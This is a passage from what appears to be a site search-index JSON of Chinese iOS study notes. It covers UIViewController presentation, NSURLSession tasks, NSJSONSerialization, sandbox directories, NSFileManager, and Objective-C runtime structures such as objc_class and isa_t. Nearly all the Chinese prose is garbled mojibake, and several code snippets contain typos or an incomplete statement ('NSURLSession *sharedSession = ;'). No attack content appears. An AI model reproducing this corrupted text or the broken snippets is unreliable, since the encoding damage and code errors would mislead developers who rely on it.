·å¼çš„ä¸€ä¸ªç±»ã€‚\nè¿™ä¸ªå¯¹è±¡æœ‰ä¸€ä¸ªåä¸º contentView çš„å­è§†å›¾ï¼Œå®ƒæœ‰ä¸‰ä¸ªå­è§†å›¾ã€‚å…³äºè¿™ä¸‰ç§è§†å›¾æœ‰ä»¥ä¸‹çš„å››ç§æ’åˆ—æ¨¡å¼ï¼š\nOC ä¸­çš„å®¹å™¨ VC ç§ç±» #  UINavigationController #  ViewController çš„æ ˆæ“ä½œåŒ…æ‹¬ Pushingã€Popingï¼Œå…¶ä»–çš„å±•ç°æ–¹å¼è¿˜åŒ…æ‹¬ Presentingã€Dissmissingï¼›\næ³¨æ„ä»¥ä¸‹çš„å‡ ç‚¹ï¼š\n  æ‰€æœ‰é€šè¿‡ prensent æ–¹å¼å±•ç°çš„ ViewController éƒ½éœ€è¦ä¸»åŠ¨è°ƒç”¨ dismissï¼›\n  ä½¿ç”¨ push æ–¹æ³•å±•ç° ViewController éœ€è¦é€šè¿‡è°ƒç”¨ pop æ–¹æ³•è¿›è¡Œæ¶ˆå¤±å±•ç¤ºï¼›\n  push ä»¥åŠ pop æ–¹æ³•åªå¯ä»¥åœ¨ UINavigationController ä¸Šè¢«è°ƒç”¨ï¼ˆå…¶ä»–çš„åªèƒ½è°ƒç”¨ presentï¼‰ï¼›\n  å½“è°ƒç”¨ä¸€ä¸ª ViewController çš„ dismiss æ–¹æ³•æ—¶ï¼Œæ‰€æœ‰é€šè¿‡è¯¥ vc present å‡ºæ¥çš„ vc éƒ½ä¼šè¢«é”€æ¯ï¼ŒåŒæ—¶åªæœ‰æœ€é¡¶éƒ¨çš„ ViewController ä¼šå±•ç°åŠ¨ç”»ã€‚\nswift ä¸º UIViewController å®šä¹‰äº†ä¸€ä¸ªå±æ€§ presentingViewController.dissmiss ç”¨äºæ‰§è¡Œè¿™ä¸€æ“ä½œï¼›\n  åŒæ—¶ Apple ä¹Ÿæä¾›äº†ä¸€ä¸ª APIï¼Œç”¨äºä»…ä»…é”€æ¯å½“å‰ vcï¼ŒpresentedViewController.dismissï¼›\n  presentedViewController ä¸ presentingViewControllerï¼š\n UIViewController çš„ä¸¤ä¸ªå±æ€§ï¼Œé»˜è®¤å€¼ä¸º nilï¼› å½“ vcA é€šè¿‡  presentViewController:animated:completion: æ–¹æ³•å±•ç° vcB æ—¶ï¼š  vcB.presentingViewController ä¼šè¢«ç½®ä¸º vcAï¼› vcA.presentedViewController ä¼šè¢«ç½®ä¸º vcBï¼›    UITabBarController #  iOS å®˜æ–¹ App ä¸­â€œåšå®¢â€ã€â€œé—¹é’Ÿâ€ç­‰çš„åº•éƒ¨å¯¼èˆªé£æ ¼ã€‚\n"},{"id":33,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/objective-csdk/9.%E7%BD%91%E7%BB%9C%E4%B8%8E%E5%AD%98%E5%82%A8/","title":"9.ç½‘ç»œä¸å­˜å‚¨","section":"Objective-C\u0026SDK","content":"ç½‘ç»œ #  åŸºç¡€çŸ¥è¯† #   ä¸¤ç§æ•°æ®äº¤æ¢æ ¼å¼ï¼šXMLã€JSONï¼ˆJavaScript Object Notationï¼‰ è°ƒè¯•å™¨ï¼š  https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx https://www.xiongdianpku.com/api/bytedance/image/list https://www.charlesproxy.com/    å¤„ç† HTTP/HTTPS è¯·æ±‚ #  NSURLSession #  ä»€ä¹ˆæ˜¯ NSURLSessionï¼Ÿ\n æœ¬èº«æ˜¯ä¸€ä¸ªç±»ï¼ŒåŒæ—¶ä¹Ÿä»£æŒ‡ä¸€å¥—ç”¨äºå¤„ç† HTTP/HTTPS è¯·æ±‚çš„ç±»ã€‚  å…³äºç±» NSURLSessionï¼š\n è´Ÿè´£ç®¡ç†å‘é€å’Œæ¥æ”¶ HTTP è¯·æ±‚ï¼› é€šè¿‡è·å–å•ä¾‹æˆ–ä¼ å…¥ NSURLSessionConfiguration åˆ›å»ºå®ä¾‹ï¼› å¯ä»¥é€šè¿‡ Block æˆ– delegate æ¥æ”¶å›è°ƒï¼›  ä¸»è¦æœ‰ä»¥ä¸‹ä¸‰ç§æ–¹æ³•åˆ›å»ºè·å–ä¸€ä¸ª sessionï¼š\n+ (NSURLSession *)sharedSession; // ä½¿ç”¨å…¨å±€çš„ Cacheã€Cookieã€è¯ä¹¦ï¼Œè·å–ä¸€ä¸ªå…±äº«çš„ä¼šè¯ã€‚  + (NSURLSession *)sessionWithConfiguration:(NSURLSessionConfiguration *)configuration; // é€šè¿‡ä¼ å…¥ä¸€ä¸ª NSURLSessioinConfigurationï¼ˆç”¨äºè®¾ç½®ç›¸å…³çš„å‚æ•°ï¼‰é…ç½®æ¥åˆ›å»ºç›¸å…³ä¼šè¯ã€‚  + (NSURLSession *)sessionWithConfiguration:(NSURLSessionConfiguration *)configuration delegate:(id \u0026lt;NSURLSessionDelegate\u0026gt;)delegate delegateQueue:(NSOperationQueue *)queue; // æ ¹æ® NSURLSessionConfigurationã€NSURLSessionDelegateã€NSOperationQueue ä¸‰ä¸ªå‚æ•°åˆ›å»ºä¼šè¯ã€‚ NSURLSessionConfiguration #  ä¸Šé¢åˆ›å»ºæ–¹æ³•ä¸­å·²ç»æåŠäº†è¿™ä¸ªç±»ï¼Œå®ƒæœ‰ä¸‰ç§ç±»å‹çš„é…ç½®ï¼š\n defaultï¼šé»˜è®¤é…ç½®ï¼Œä½¿ç”¨å…¨å±€çš„ Cacheã€Cookieã€è¯ä¹¦ï¼› ephemeralï¼šä¸é»˜è®¤é…ç½®ç±»ä¼¼ï¼Œæ‰€æœ‰ä¸ä¼šè¯ç›¸å…³çš„æ•°æ®éƒ½å­˜å‚¨åœ¨å†…å­˜ä¸­ï¼› backgroundï¼šä¼šè¯åœ¨åå°ä¸Šæ‰§è¡Œä¸Šä¼ ä¸‹è½½ä»»åŠ¡ï¼Œå³ä½¿åº”ç”¨ç¨‹åºæœ¬èº«è¢«ç³»ç»Ÿæš‚å®šæˆ–ç»ˆæ­¢ï¼Œä¼ è¾“ä»ç„¶ä¼šç»§ç»­ã€‚  NSURLSessionTask #  ç³»ç»Ÿä¸ºä¸åŒçš„ä¸Šä¼ ä¸‹è½½ç±»å‹å°è£…äº†ä¸åŒçš„ç±»ï¼Œå…¶ä¸­ NSURLSessionTask æ˜¯è¿™äº›ç±»çš„åŸºç±»ï¼š\n NSURLSessionTaskï¼šä¸€ä¸ªæŠ½è±¡åŸºç±»éœ€è¦å®ç°ä¸‰ä¸ªæ–¹æ³•ï¼ˆcancelã€suspendã€resumeï¼‰  ä¸‹é¢æˆ‘ä»¬åˆ†åˆ«ä»‹ç»è¿™ä¸ªåŸºç±»æ´¾ç”Ÿå‡ºæ¥çš„å‡ ä¸ªç±»ï¼š\n  NSURLSessionDataTaskï¼š\nNSString *dataUrl = @\u0026#34;your_data_url\u0026#34;; NSURL *url = [NSURL URLWithString:dataUrl];  NSURLSessionTask *downloadTask = [[NSURLSession sharedSession] // åˆ›å»ºä¸€ä¸ªNSURLSessionå¯¹è±¡  dataTaskWithURL:url // æŒ‡å®šä¸€ä¸ªNSURLå¯¹è±¡  compeletionHandler:^(NSData *data, NSURLResponse *reponse, NSError *error){}]; // é€šè¿‡BlockæŒ‡å®šå›è°ƒæ–¹æ³•  [downloadTask resume];   NSURLSessionDownloadTaskï¼šä¸‹é¢æ˜¯åˆ›å»ºä¸€ä¸ªä¸‹è½½ä»»åŠ¡çš„ç¤ºä¾‹ä»£ç ï¼š\nNSURL *url = [NSURL URLWithString:@\u0026#34;blabla\u0026#34;]; NSMutableURLRequest *req = [NSMutableURLRequest requestWithURL:url]; [req setHTTPMethod:@\u0026#34;GET\u0026#34;];  NSURLSession *sharedSession = ; NSURLSessionDownloadTask *task = [[NSURLSession sharedSession]  downloadTaskWithRequest:req  completionHandler:^(NSURL *_Nullable location, NSURLResponse *_Nullable response, NSError *_Nullable error){  if(!error \u0026amp;\u0026amp; response \u0026amp;\u0026amp; location) // æ£€æŸ¥æ˜¯å¦ä¸‹è½½æˆåŠŸ  [self handleDownloadFile:location];  }]; å¦å¤–ï¼Œä¸‹è½½ä»»åŠ¡ä¸€ä¸ªå¸¸è§çš„éœ€æ±‚å°±æ˜¯è·å–ä¸‹è½½è¿›åº¦ï¼Œè¿™ä¸ªå¦‚ä½•å®ç°å‘¢ï¼Ÿ\n ä½¿ç”¨ä»£ç†ï¼Œæ¯”å¦‚å¯¹äº NSURLSessionDownloadTask å¯ä»¥å®ç° NSURLDownloadDelegate åè®®ã€‚    NSURLSessionUploadTaskï¼šè¿™ä¸ªæ–¹æ³•ç»§æ‰¿è‡ª NSURLSessionDataTask\n  JSON ç¼–ç è§£ç  #  åœ¨ Objetive-C ä¸­ï¼Œä¸»è¦ä½¿ç”¨ NSJsonSerialization è¿™ä¸ªç±»å¯¹è¿›è¡Œå­—ç¬¦ä¸²ä¸ json ä¹‹é—´çš„è½¬æ¢ï¼š\n// JsonData ==\u0026gt; FoundationObjects + (id)JSONObjectWithData:(NSData *)data options:(NSJSONReadingOptions)opt error:(NSError **)error;  // FoundationObjects ==\u0026gt; JsonData + (NSData *)dataWithJSONObjects:(id)obj options:(NSJSONWritingOptions)opt error:(NSError **)error; å…¶ä¸­çš„åŸºç±»éœ€è¦æ»¡è¶³ä»¥ä¸‹çš„è¦æ±‚ï¼š\n é¡¶å±‚å¯¹è±¡å¿…é¡»æ˜¯ NSArray æˆ– NSDictionaryï¼› æ‰€æœ‰å¯¹è±¡å¿…é¡»æ˜¯ NSStringã€NSNumberã€NSArrayã€NSDictionary æˆ–è€… NULLï¼› æ‰€æœ‰å­—å…¸çš„é”®å€¼éƒ½æ˜¯å­—ç¬¦ä¸²ç±»å‹çš„ï¼› æ•°å€¼ç±»å‹å˜é‡ä¸èƒ½æ˜¯éæ•°å€¼æˆ–è€…æ— ç©·å¤§ï¼›  æ–‡ä»¶æ“ä½œ #  Bundle #  ä»€ä¹ˆæ˜¯ bundleï¼ŸApple document\n bundle æ˜¯æ“ä½œç³»ç»Ÿå°†å¯æ‰§è¡Œä»£ç ä¸ç›¸å…³èµ„æºæ•´åˆèµ·æ¥ï¼Œå­˜å‚¨åœ¨æ–‡ä»¶ç³»ç»Ÿä¸­çš„ä¸€ä¸ªæ–‡ä»¶å¤¹ï¼› åœ¨ iOS æˆ– OS X ä¸­ï¼Œåº”ç”¨ã€æ¡†æ¶æˆ–å…¶ä»–è½¯ä»¶éƒ½æ˜¯ bundleã€‚ Objective-C ä¸­å¸¸è§çš„ Foundation ä¸ Core Foundation å…³é”®è¯å°±æ˜¯ç”¨è¯­å®šä½å’ŒåŠ è½½ bundle èµ„æºçš„ã€‚  åœ¨ Objetive-C ä¸­ï¼Œé€šè¿‡ä¸‹é¢çš„æ–¹æ³•å³å¯è·å–ä¸€ä¸ªèµ„æºæ–‡ä»¶çš„ç»å¯¹è·¯å¾„ï¼š\nNSBundle *main = [NSBundle mainBundle]; NSString *resourcePath = [main pathForResource:@\u0026#34;Seagull\u0026#34; ofType:@\u0026#34;jpg\u0026#34;]; è¯»å–æ–‡ä»¶ #  iOS ä¸­å°†æ–‡ä»¶åˆ†ä¸ºå››ç§æ–‡ä»¶ç±»å‹ï¼Œåˆ†åˆ«å¯¹åº”ç€å››ä¸ªä¸åŒçš„ç›®å½•ï¼š\n  Home ç›®å½•ï¼šNSHomeDirectory()\n  Document ç›®å½•ï¼šç”¨äºä¿å­˜ç”¨æˆ·ç”Ÿæˆçš„æ•°æ®ï¼š\nNSArray *paths = NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES); NSString *path = [paths objectAtIndex:0];   Library ç›®å½•ï¼šé™¤ caches ä¹‹å¤–çš„éç”¨æˆ·æ•°æ®ï¼š\nNSArray *paths = NSSearchPathForDirectoriesInDomains(NSLibraryDirectory, NSUserDomainMask, YES); NSString *path = [paths objectAtIndex:0];   Cache ç›®å½•ï¼šä¸´æ—¶æ–‡ä»¶ï¼Œè¿™ä¸ªæ–‡ä»¶å¤¹ä¸­çš„æ–‡ä»¶ App åº”è¯¥ä¸´æ—¶æ¸…ç†ï¼Œå­˜å‚¨ç©ºé—´ä¸è¶³æ—¶ä¸»åŠ¨æ¸…ç†ï¼š\nNSArray *paths = NSSearchPathForDirectoriesInDomains(NSCachesDirectory, NSUserDomainMask, YES); NSString *path = [paths objectAtIndex:0];   æ–‡ä»¶æ“ä½œ #  æ¯”å¦‚æˆ‘ä»¬é€šè¿‡ä»¥ä¸‹çš„ä»£ç å¾—åˆ°äº†ä¸€ä¸ª FileManagerï¼š\nNSFileManager *fileManager = [NSFileManager defaultManager]; ä¹‹åæˆ‘ä»¬é€šè¿‡ä»¥ä¸‹çš„è¿™äº›æ–¹æ³•è¿›è¡Œæ–‡ä»¶ç›¸å…³æ“ä½œï¼š\n  åˆ¤æ–­æ–‡ä»¶æ˜¯å¦å­˜åœ¨ï¼š\nBOOL fileExists = [fileManager fileExistsAtPath:[fileURL path]];   è¯»å–æ–‡ä»¶ä¿¡æ¯ï¼š\nNSDictionary *attr = [fileManager attributesOfItemAtPath:[fileURL path] error:\u0026amp;error];   éå†ç›®å½•ä¸‹çš„æ‰€æœ‰æ–‡ä»¶ï¼š\n[fileManager contentsOfDirectoryAtURL:bundleURL includingPropertesForKeys:@[] options:NSDirectoryEnumerationSkipsHiddenFiles error:nil];   åˆ›å»ºç›®å½•ï¼š\n[fileManager createDirectoryAtPath:imagesPath withIntermediateDirectories:NO attribute:nil error:\u0026amp;error];   ç§»åŠ¨æ–‡ä»¶ï¼š\n[[NSFileManager defaultManager] moveItemAtURL:source toURL:destination error:\u0026amp;err];   åˆ é™¤æ–‡ä»¶/ç›®å½•ï¼š\n[fileManager removeItemAtPath:filePath error:\u0026amp;error];   "},{"id":34,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/runtime/1.%E7%AE%80%E4%BB%8B/","title":"1.ç®€ä»‹","section":"Runtime","content":" å‚è€ƒèµ„æ–™ï¼š\n https://halfrost.com/objc_runtime_isa_class/ https://en.wikipedia.org/wiki/Runtime_library   ç®€ä»‹ #  ä»€ä¹ˆæ˜¯ Runtime #  Runtime é¡¾åæ€ä¹‰æ˜¯è¿è¡Œæ—¶çš„æ„æ€ï¼Œä¹Ÿå°±æ˜¯æŒ‡ç¨‹åºè¿è¡Œçš„æ—¶å€™ã€‚\nå¯¹äºåŠ¨æ€è¯­è¨€æ¥è¯´ï¼Œé€šå¸¸ä¼šæœ‰å¾ˆå¤šéœ€è¦è¿è¡Œæ—¶æ‰å¯ä»¥ç¡®å®šçš„ç‰¹æ€§ï¼Œæ¯”å¦‚ï¼šObjective-C ä¸­çš„æ¶ˆæ¯è½¬å‘æœºåˆ¶ã€Python ä¸­çš„å˜é‡ç±»å‹æœºåˆ¶ç­‰ã€‚å®ç°è¿™äº›åŠ¨æ€åŠŸèƒ½çš„å‡½æ•°é€šå¸¸è¢«å°è£…æˆä¸€ä¸ªåº“ï¼Œç§°ä½œä¸ºè¿è¡Œæ—¶åº“ã€‚\nè¿™é‡Œè¦è®²çš„ Objective-C çš„ Runtime å°±æ˜¯ OC çš„è¿è¡Œæ—¶åº“ã€‚\nObjective-C çš„ Runtime #  Objective-C æœ‰ä¸€äº›åŠ¨æ€ç‰¹æ€§éœ€è¦è¿è¡Œæ—¶åº“æ¥å®Œæˆï¼š\n  ç±»çš„æ–¹æ³•è°ƒç”¨ã€æ¶ˆæ¯è½¬å‘æ˜¯é—´æ¥çš„ï¼šä¼ ç»Ÿçš„å‡½æ•°ä¸€èˆ¬åœ¨ç¼–è¯‘æ—¶å°±å·²ç»æŠŠå‚æ•°ä¿¡æ¯å’Œå‡½æ•°å®ç°æ‰“åŒ…åˆ°ç¼–è¯‘åçš„æºç ä¸­äº†ï¼›åœ¨ OC ä¸­ï¼Œè°ƒç”¨ä¸€ä¸ªå®ä¾‹çš„æ–¹æ³•ï¼Œæ‰€åšçš„æ˜¯å‘è¯¥å®ä¾‹çš„æŒ‡é’ˆå‘é€æ¶ˆæ¯ï¼Œå®ä¾‹åœ¨æ”¶åˆ°æ¶ˆæ¯åï¼Œä»è‡ªèº«çš„å®ç°ä¸­å¯»æ‰¾å“åº”è¿™æ¡æ¶ˆæ¯çš„æ–¹æ³•ã€‚\n  ç±»æ˜¯åŠ¨æ€åˆ›å»ºçš„ï¼šæŒæœ‰æ–¹æ³•ã€æ–¹æ³•å®ç°ã€åè®®ç­‰ï¼Œéƒ½æ˜¯åœ¨åˆ›å»ºçš„æ—¶å€™ç»‘å®šåœ¨å¯¹è±¡ä¸Šçš„ï¼›\nç®€å•çš„å¯ä»¥ç®€åŒ–æˆ Runtime ç®¡ç†çš„éƒ½æ˜¯ idï¼ˆid çš„æœ¬è´¨å…¶å®æ˜¯ objc_object, objc_class å¤´éƒ¨å…¶å®å°±æ˜¯ id, ä¹Ÿå°±æ˜¯isaï¼‰ã€‚\n  Objective-C çš„ç¼–è¯‘è¿è¡Œç»“æ„å¤§è‡´å¦‚ä¸‹ï¼š\n+--------------------------------------+ | objective-C source code | | +-------------------+-------------+ | | Framework\u0026amp;Service | Runtime API | +----+-------------------+-------------+ | compiler | +--------------------------------------+ | Runtime System Library | +--------------------------------------+ Objective-C çš„ä»£ç ä¸ Runtime çš„äº¤äº’å‘ç”Ÿåœ¨ä»¥ä¸‹çš„ä¸‰ä¸ªæƒ…å†µä¸‹ï¼š\n  é€šè¿‡ Objective-C æºä»£ç ï¼šæ‰€æœ‰çš„ Objective-C çš„ä»£ç æœ€åéƒ½ä¼šç¼–è¯‘æˆè¿è¡Œæ—¶ä»£ç ï¼›\n  é€šè¿‡ Foundation æ¡†æ¶ä¸­ NSObject ç±»ä¸­å®šä¹‰çš„æ–¹æ³•ï¼šåœ¨ OC ä¸­ï¼Œé™¤äº† NSProxy ä»¥å¤–ï¼Œæ‰€æœ‰çš„ç±»éƒ½æ˜¯ NSObject çš„å­ç±»ï¼Œè¿™ä¸¤ä¸ªç±»éƒ½éµå¾ªäº† NSObject åè®®ã€‚\nå› æ­¤ NSObject åè®®ä¸­çš„æ–¹æ³•æ˜¯æ‰€æœ‰ OC å¯¹è±¡çš„å…¬å…±æ–¹æ³•ï¼Œè¿™ä¸ªåè®®å®šä¹‰åœ¨äº† Public Headers/NSObject.h è¿™ä¸ªæ–‡ä»¶ä¸­ã€‚\n  é€šè¿‡å¯¹Runtime åº“å‡½æ•°çš„ç›´æ¥è°ƒç”¨ï¼šè§ å®˜æ–¹æ–‡æ¡£ã€‚\nä¸è¿‡ä» Xcode5 å¼€å§‹ï¼Œè‹¹æœå®˜æ–¹ä¸å»ºè®®ç›´æ¥è°ƒç”¨ Runtime çš„æ¥å£ï¼Œå¦‚æœéœ€è¦ä»£ç è¡¥å…¨ï¼Œéœ€è¦åœ¨ Xcode ä¸­å¼€å¯ä¸€ä¸ªå…·ä½“çš„è®¾ç½® Enable Strict Checking of objc_msgSend Callsã€‚\n  "},{"id":35,"href":"/docs/%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8%E6%8E%A5%E5%8F%A3/ios/runtime/2.%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/","title":"2.æ•°æ®ç»“æ„","section":"Runtime","content":" å‚è€ƒï¼š\n https://halfrost.com/objc_runtime_isa_class/ http://www.cocoawithlove.com/2010/01/what-is-meta-class-in-objective-c.html https://draveness.me/method-struct   NSObject #  NSObject åè®®ä¸­å®šä¹‰çš„å¤šç§æ–¹æ³•ï¼Œæ˜¯ OC ä»£ç ä¸ Runtime å‘ç”Ÿäº¤äº’çš„é‡è¦ä½ç½®ã€‚\nNSObject åŸºç±» #  è¿™ä¸ªç±»ä¸ NSObject åè®®å®šä¹‰åœ¨äº†ä¸€ä¸ªæ–‡ä»¶ Public Headers/NSObjects.h ä¸­ï¼š\nOBJC_ROOT_CLASS OBJC_EXPORT @interface NSObject \u0026lt;NSObject\u0026gt; {  Class isa OBJC_ISA_AVAILABILITY; } å…¶ä¸­ï¼š\n  OBJC_ROOT_CLASS æ˜¯ä¸€ä¸ªå®ï¼š\n#if !defined(OBJC_ROOT_CLASS) # if __has_attribute(objc_root_class) # define OBJC_ROOT_CLASS __attribute__((objc_root_class)) # else # define OBJC_ROOT_CLASS # endif #endif å®ƒä¸º NSObject è¿™ä¸ªç±»é™„åŠ äº† objc_root_class è¿™ä¸ªå±æ€§ï¼Œè¿™æ˜¯ GNU C çš„ç‰¹æ€§ï¼Œè§ï¼šAttribute\n  OBJC_EXPORT ä¹Ÿæ˜¯ä¸€ä¸ªå®ï¼Œå®ƒæ ‡è®°äº†è¿™ä¸ªç±»å¯ä»¥è¢«ä»»æ„å¤–éƒ¨ä½ç½®è®¿é—®åˆ°ï¼›\n  isa æ˜¯ä¸€ä¸ªå˜é‡åï¼ŒClass æ˜¯ä¸€ä¸ªå˜é‡ç±»å‹ï¼ŒOBJC_ISA_AVAILABILITY ä¹Ÿæ˜¯ä¸€ä¸ªå®ï¼Œåœ¨ ObjC2 ç‰ˆæœ¬ä»¥åï¼Œisa è¿™ä¸ªå˜é‡è¢«æ ‡è®°ä¸ºè¿‡æœŸçš„å±æ€§ï¼Œå…·ä½“åœ¨ objc_object ä¸­å®ç°ï¼ˆä¸‹é¢è¯¦ç»†è§£é‡Šï¼‰ã€‚\n  Class ä¸ id çš„å®šä¹‰åœ¨ Public Headers/objc.h è¿™ä¸ªæ–‡ä»¶ä¸­ï¼š\n#if !OBJC_TYPES_DEFINED /// An opaque type that represents an Objective-C class. typedef struct objc_class *Class;  /// Represents an instance of a class. struct objc_object {  Class isa OBJC_ISA_AVAILABILITY; };  /// A pointer to an instance of a class. typedef struct objc_object *id; #endif objc_class æˆ– Class #  è¿™ä¸ªç±»æ˜¯æ‰€æœ‰Objective-C ç±»çš„å¤«ç±»ã€‚\nåœ¨ Objc2 ä¹‹å‰ï¼Œè¯¥ç±»çš„å®šä¹‰åœ¨ Public Headers/runtime.h ä¸­ï¼Œå‚è€ƒæ„ä¹‰ä¸å¤§å°±ä¸åˆ—ä¸¾äº†ï¼Œå°±æ˜¯ä¸€ä¸ªç®€å•çš„å­—æ®µç»„åˆã€‚åœ¨ 2006 å¹´è‹¹æœå…¬å¸å‘å¸ƒ Objcive-C 2.0 ä¹‹åï¼Œè¯¥ç±»çš„å®šä¹‰åœ¨ Public Headers/objc-runtime-new.h è¿™ä¸ªæ–‡ä»¶ä¸­ï¼š\nstruct objc_class : objc_object {  // Class ISA;  Class superclass;  cache_t cache; // formerly cache pointer and vtable  class_data_bits_t bits; // class_rw_t * plus custom rr/alloc flags \t class_rw_t *data() {  return bits.data();  }  void setData(clas_rw_t *newData) {  bits.setData(newData);  } \t// æ­¤å¤„æœ‰çœç•¥ä¸€äº›ç±»æ–¹æ³•... }  superclass æ˜¯ç”¨äºæŒ‡å‘å¤«ç±»çš„æŒ‡é’ˆï¼ˆNSObject ä¸­ä¹Ÿæœ‰ä¸€ä¸ªåŒåçš„ç±»æ–¹æ³•ï¼‰ï¼› cache æ˜¯æ–¹æ³•ç¼“å­˜ï¼› class_data_bits_t æ˜¯ä¸€ä¸ªå°è£…äº†æ¯”ç‰¹ä½çš„ç±»ï¼Œbits æ˜¯è¿™ä¸ªç±»å¯¹åº”å®ä¾‹çš„æ–¹æ³•é“¾è¡¨ã€‚  è¿™ä¸ªç±»ä¸»è¦å°è£…äº†ä¸é¢å‘å¯¹è±¡ç›¸å…³çš„æ–¹æ³•ï¼Œæ¯”å¦‚ç»§æ‰¿ã€å“ˆå¸ŒåŒ–ç­‰ã€‚\nobjc_object æˆ– id #  è¿™ä¸ªç±»æ˜¯åŒ…æ‹¬ object_class åœ¨å†…çš„æ‰€æœ‰å®ä¾‹å¯¹è±¡çš„å¤«ç±»ã€‚\nå®ƒå®šä¹‰åœ¨äº†æ–‡ä»¶ Project Headers/objc-private.hï¼Œæ˜¯ä¸€ä¸ªä¸å¯¹å¤–æš´éœ²çš„ç§æœ‰ç±»ï¼ˆå¯¹å¤–æš´éœ²ä¸º idï¼‰ï¼š\nstruct objc_object { private:  isa_t isa;  // æ­¤å¤„æœ‰çœç•¥ä¸€äº›ç±»æ–¹æ³•...  public:  Class ISA();  Class getIsa(); } isa è¿™ä¸ªå˜é‡æ˜¯è¿™ä¸ªç±»æœ€æ ¸å¿ƒçš„åŠŸèƒ½ï¼Œå®ƒç”¨äºæŒ‡å®šå®ä¾‹å®ç°çš„ç±»ã€‚è§‚å¯Ÿå‡½æ•°ä¹Ÿä¼šå‘ç°ï¼Œå®ƒä¸»è¦å®ç° dealloc / retain / release ç­‰ææ„ã€åˆå§‹åŒ–ã€å†…å­˜ç®¡ç†ç›¸å…³çš„å·¥ä½œã€‚\nå°ç»“ï¼šMetaClass #  ç”±ä¸Šé¢çš„åˆ†ææˆ‘ä»¬å¾—å‡ºä¸€ä¸ªé‡è¦çš„ç»“è®ºï¼šObjective-C ä¸­ç±»ä¹Ÿæ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œè¿™ä¸ªå¯¹è±¡æ˜¯å•ä¾‹æ¨¡å¼ã€‚å®é™…ä¸Šè¿™äº›å•ä¾‹æ¨¡å¼çš„å¯¹è±¡æ˜¯åœ¨ main å‡½æ•°æ‰§è¡Œä¹‹å‰ï¼Œä» dyld åˆ° runtime è¿™æœŸé—´åˆ›å»ºçš„ã€‚\næ—¢ç„¶ OC ç±»æ´¾ç”Ÿè‡ª objc_objectï¼Œå®ƒå°±ä¸€å®šæœ‰ isa è¿™ä¸ªæˆå‘˜ï¼Œé‚£ä¹ˆ OC ç±»çš„ isa æŒ‡é’ˆåº”è¯¥æŒ‡å‘å“ªé‡Œå‘¢ï¼Ÿ\nè¿™å°±ç‰µæ¶‰åˆ° isa æœ€é‡è¦çš„ä½œç”¨ï¼šæ¶ˆæ¯ä¼ é€’ã€‚è¿™é‡Œç®€å•ä»‹ç»ä¸€ä¸‹æ¶ˆæ¯ä¼ é€’çš„æµç¨‹ï¼š\n å½“æºä»£ç å‘ä¸€ä¸ªå¯¹è±¡å‘é€æ¶ˆæ¯æ—¶ï¼Œä¼šé¦–å…ˆæŸ¥æ‰¾è¿™ä¸ªè¿™ä¸ªå¯¹è±¡çš„ isa å‚æ•°ï¼› isa å‚æ•°æŒ‡å‘ä¸€ä¸ªç±»ï¼ŒRuntime æŸ¥æ‰¾è¿™ä¸ªç±»çš„æ–¹æ³•é“¾è¡¨ä¸­æŸ¥æ‰¾å¹¶æ‰§è¡Œè¿™ä¸ªæ–¹æ³•ï¼›  å› æ­¤ä¸ºäº†ä½¿ Objective-C ä¸­çš„ç±»ä¹Ÿå¯ä»¥åŒæ ·æ¥å—æ¶ˆæ¯ï¼ŒObjective-C å°†ç±»æ–¹æ³•åˆ†ç¦»äº†å‡ºå»ï¼Œç§°ä½œå…ƒç±»ï¼ˆå³ Meta Classï¼‰ã€‚Instanceã€Classã€Meta-Class ä¸‰è€…çš„å…³ç³»å¤§è‡´å¦‚ä¸‹å›¾ï¼š\nå…¶ä¸­çš„ superclass ä¸º nil çš„ Root class å³ä¸º NSObjectã€‚NSObject æœ¬è´¨æ˜¯ objc_class è¿™ä¸ªç±»çš„å•ä¾‹ã€‚\nisa_t #  ä¹‹å‰ä¹Ÿæåˆ°äº†ï¼Œåœ¨ Objective-C ä¸­æ¯”è¾ƒæ ¸å¿ƒçš„ isaï¼Œå®ƒçš„ç±»å‹ä¸º isa_tã€‚å®ƒçš„å®ç°å¦‚ä¸‹ï¼š\nunion isa_t {  isa_t() { }  isa_t(uintptr_t value) : bits(value) { }   Class cls;  uintptr_t bits;  #if defined(ISA_BITFIELD)  struct {  ISA_BITFIELD;  }; #endif \t// ä¸‹é¢åˆ†åˆ«ä¸º __arm64__ ä¸ __x86_64__ å®šä¹‰äº†ä¸¤ä¸ªæ–‡ä»¶... } class_data_bits_t #  objc_class çš„ä¸€ä¸ªæˆå‘˜çš„ç±»å‹ä¸º class_data_bits_tï¼Œå®ƒçš„å£°æ˜å¦‚ä¸‹ï¼š\nstruct class_data_bits_t {  // Values are the FAST_ flags above.  uintptr_t bits; private:  // ä¸€äº›æˆå‘˜æ–¹æ³•... public:  class_rw_t* data() {  return (class_rw_t *)(bits \u0026amp; FAST_DATA_MASK);  }  void setData(class_rw_t *newData)  {  assert(!data() || (newData-\u0026gt;flags \u0026amp; (RW_REALIZING | RW_FUTURE)));  // Set during realization or construction only. No locking needed.  bits = (bits \u0026amp; ~FAST_DATA_MASK) | (uintptr_t)newData;  } \t// ä¸€äº›æˆå‘˜æ–¹æ³•... } è¿™ä¸ªç»“æ„ä½“åªæœ‰ä¸€ä¸ª 64 ä½çš„æˆå‘˜å˜é‡ bitsã€‚è€Œå®ƒæœ€é‡è¦çš„ä¸¤ä¸ªç±»æ–¹æ³•ä¹Ÿåˆ—ä¸¾äº†å‡ºæ¥ï¼šdataã€setDataã€‚\nbits çš„å†…å­˜å¸ƒå±€å¯ä»¥ç”¨ä¸‹é¢çš„ç¤ºæ„å›¾è¡¨ç¤ºï¼š\n is_swiftï¼šæŒ‡ç¤ºæŒæœ‰å®ƒçš„ objc_class æ˜¯ä¸æ˜¯ä¸€ä¸ª swift è¯­è¨€çš„ç±»ï¼› has_default_rrï¼šæŒ‡ç¤ºæŒæœ‰å®ƒçš„ objc_class æœ‰æ²¡æœ‰é»˜è®¤å®ç° retain/release/autorelease ç­‰æ–¹æ³•ï¼›  class_rw_t ä¸ class_ro_t #  ä¸€ä¸ª objc_class 